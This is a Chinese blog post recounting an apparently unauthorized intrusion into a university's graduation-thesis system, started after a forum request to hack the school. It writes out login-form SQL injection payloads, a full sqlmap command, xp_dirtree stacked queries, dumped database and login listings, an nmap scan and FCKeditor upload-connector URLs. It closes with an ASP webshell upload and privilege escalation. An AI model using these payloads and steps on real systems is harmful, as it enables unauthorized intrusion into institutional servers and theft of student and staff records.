---
layout: post
title: 记对某大学毕设系统的一次渗透测试
summary: 注入没找到管理员表，内心是绝望的
featured-img: pen
---

前几天在V站上看见一个帖子，问谁能帮忙入侵自己学校的毕设系统，估计是个毕设懒得想做动歪脑筋的

进入他给的连接随手在登录框测试`username=admin' or '1'='1`，发现存在报错回显，经测试username存在注入，闭合为`('$user')`，报错注入测试爆出数据库名`admin') and 0<>db_name()-- `

一个211大学，18年5月还在使用的系统安全做成这样，值得思考，这样的系统简直就像在首页挂着FUCK ME

***

接着将post请求写入txt，拿出sqlmap挂上代理测试：

`proxychains sqlmap -r test.txt --dbms "Microsoft SQL Server" -p username --random-agent --tamper=charunicodeencode --batch --threads 8 --technique U`

使用UNION或者ERROR-BASED注入都可以

```
sqlmap identified the following injection point(s) with a total of 30 HTTP
(s) requests:
---
Parameter: username (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 13 columns
    Payload: username=a') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,N
ULL,NULL,CHAR(113)+CHAR(112)+CHAR(98)+CHAR(98)+CHAR(113)+CHAR(114)+CHAR(82
)+CHAR(71)+CHAR(75)+CHAR(86)+CHAR(103)+CHAR(114)+CHAR(65)+CHAR(116)+CHAR(8
1)+CHAR(101)+CHAR(74)+CHAR(112)+CHAR(108)+CHAR(108)+CHAR(109)+CHAR(98)+CHA
R(74)+CHAR(77)+CHAR(118)+CHAR(72)+CHAR(89)+CHAR(69)+CHAR(121)+CHAR(100)+CH
AR(119)+CHAR(104)+CHAR(116)+CHAR(69)+CHAR(72)+CHAR(69)+CHAR(68)+CHAR(80)+C
HAR(90)+CHAR(71)+CHAR(68)+CHAR(76)+CHAR(98)+CHAR(115)+CHAR(84)+CHAR(113)+C
HAR(107)+CHAR(122)+CHAR(106)+CHAR(113),NULL,NULL,NULL,NULL-- aGpS&password
=a&btnsub=%E7%99%BB%E5%BD%95
---
web server operating system: Windows 2003 or XP
web application technology: ASP.NET, Microsoft IIS 6.0, ASP
back-end DBMS: Microsoft SQL Server 2008
```

爆出51个数据库：

```
available databases [51]:
[*] cxjj08
[*] cxjj09
[*] cxjj10
[*] cxjj11
[*] cxjj12
[*] cxjj13
[*] gdsx
[*] jqgxs
[*] jsic
[*] master
[*] mn
[*] model
[*] msdb
[*] PaperChooseb2006
[*] PaperChooseb2007
[*] PaperChooseb2008
[*] PaperChooseb2009
[*] PaperGuideline
[*] ReportServer
[*] ReportServerTempDB
[*] s33
[*] sd2019
[*] sdms07
[*] sdms08
[*] sdms09
[*] sdms10
[*] sdms11
[*] sdms12
[*] sdms13
[*] sdms14
[*] sdms15
[*] sdms16
[*] sdms17
[*] sdms18
[*] sdms2018
[*] sdmscx
[*] sdmsjc08
[*] sdmsjc09
[*] sdmsjc10
[*] sdmsjc11
[*] sdmsjc12
[*] sdmsjc13
[*] sdmsjc14
[*] sdmsjc15
[*] sdmsjc16
[*] sdmsjc17
[*] sdmsjc18
[*] sdmspj18
[*] sdmsys
[*] sdtest
[*] tempdb
```

爆出数据库中的user表，3800+个字段

账号分为3类：

+ 学生账号
+ 普通教师账号
+ 教师管理员账号

进入教师管理员账号但发现无上传文件的地方

***

接着爆出了系统表`master`，拿到数据库`sa`的密码为空：

```
Database: master
Table: sys.sql_logins
[2 entries]
+------+---------------+
| name | password_hash |
+------+---------------+
| sa   | NULL          |
| sdms | NULL          |
+------+---------------+
```

拿出nmap扫描服务器端口

```

Host is up (0.066s latency).
Not shown: 988 filtered ports
PORT      STATE  SERVICE
80/tcp    open   http
554/tcp   open   rtsp
1723/tcp  open   pptp
1755/tcp  open   wms
2005/tcp  closed deslogin
2006/tcp  closed invokator
2007/tcp  closed dectalk
2008/tcp  closed conf
2009/tcp  closed news
2010/tcp  closed search
2013/tcp  closed raid-am
20000/tcp closed dnp

```

没有开1433端口，不然可以尝试远程登录数据库

***

想尝试利用xp_dirtree获取系统路径直接写入webshell

在登录框注入`admin');create table dirs(paths varchar(1000))-- `

之后sqlmap查询表项，看见成功创建

```
Database: sdmsjc18
[43 tables]
+--------------------+
| T_Achievement      |
| T_BS_Article       |
| T_BS_CalendarLog   |
| T_BS_ConfigInfo    |
| T_BS_Group         |
| T_BS_GroupLimit    |
| T_BS_User          |
| T_Department       |
| T_ExpertGraded     |
| T_ExpertGradedtemp |
| T_Speciality       |
| T_Student          |
| T_Subject          |
| T_SubjectB         |
| T_Superexcellence  |
| T_Teacher          |
| T_TeacherPost      |
| T_bsAuditingGroup  |
| T_bsCompete        |
| T_bsCompeteB       |
| T_bsExamArrange    |
| T_bsExamine        |
| T_bsExamineB       |
| T_bsExamineR       |
| T_bsExpert         |
| T_bsFinalReport    |
| T_bsMain           |
| T_bsMainB          |
| T_bsPgrade         |
| T_bsProcess        |
| T_bsReplyGroup     |
| T_bsRresult        |
| T_bsRresultC       |
| T_bsStudInfo       |
| T_bsTask           |
| T_bsTaskLn         |
| T_bs_governor      |
| T_bs_student       |
| T_bs_teacher       |
| T_bstj             |
| T_mail             |
| dirs               |
| tty                |
+--------------------+

```

接着执行xp_dirtree获取绝对路径，在登录框注入：

`admin');insert into dirs(paths) exec master..xp_dirtree 'c:/'--   `

结果sqlmap读取为空表，xp_dirtree执行失败

***

御剑扫描后台发现了当前目录下的1.txt文件，爆出了当前站的物理路径

```
 驱动器 E 中的卷是 Data2
 卷的序列号是 8EDA-88C1

 E:\WWW\AspWebApp\******** 的目录

2012-11-23  14:12    <DIR>          .
2012-11-23  14:12    <DIR>          ..
2010-11-05  00:17               656 #安装设置.inf
2012-11-23  14:12                 0 1.txt
2010-11-05  00:17             4,419 ********.asp
2012-06-06  11:36            35,718 ********.xml
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:09    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2010-11-05  00:17             1,686 ********.asp
2010-11-05  00:17             1,888 ********.asp
2010-11-05  00:17             1,610 ********.asp
2010-11-05  00:17             1,617 ********.asp
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2010-11-05  00:17             3,597 ********.asp
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2010-11-05  00:17               621 ********.asp
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2010-11-05  00:17               909 ********.asp
2010-11-05  00:17             1,275 ********.asp
2010-11-05  00:17             2,131 ********.asp
2012-11-23  14:05    <DIR>          ********
2010-11-05  00:17               978 ********.asp
2010-11-05  00:17               688 ********.asp
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2010-11-05  00:17               346 ********.asp
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2010-11-05  00:17               551 ********.asp
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2012-11-23  14:05    <DIR>          ********
2010-11-05  00:17               656 ********.inf
              18 个文件         59,346 字节
              34 个目录 62,697,091,072 可用字节
```

但是xp_cmdshell被禁用，恢复无效，也不是sa账户，无法写入webshell

***

之后又发现了FCK Editor留下的文件上传后门，用了一个FCK字典扫出了

```
http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=file&Connector=connectors/asp/connector.asp
http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp
http://xxx.edu.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=file&Connector=connectors/asp/connector.Asp
http://xxx.edu.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=//connectors/asp/connector.asp
http://xxx.edu.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/asp/connector.asp
http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp
http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/asp/connector.asp
http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/aspx/connector.aspx
http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/asp/connector.aspx
http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/asp/connector.php
http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector
http://xxx.edu.cn/fckeditor/editor/fckeditor.html
http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/browser.html		
http://xxx.edu.cn/FCKeditor/editor/fckeditor.html
```

![](https://upload-images.jianshu.io/upload_images/11356161-e2ca112b8266a015.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



这里FCK漏洞是`http://xxx.edu.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/asp/connector.asp`，type=all则上传文件类型无限制

一般有`browser.asp`/`connector.asp`/`test.asp`

直接上传asp webshell，菜刀连接，接着`net localgroup`提权，over
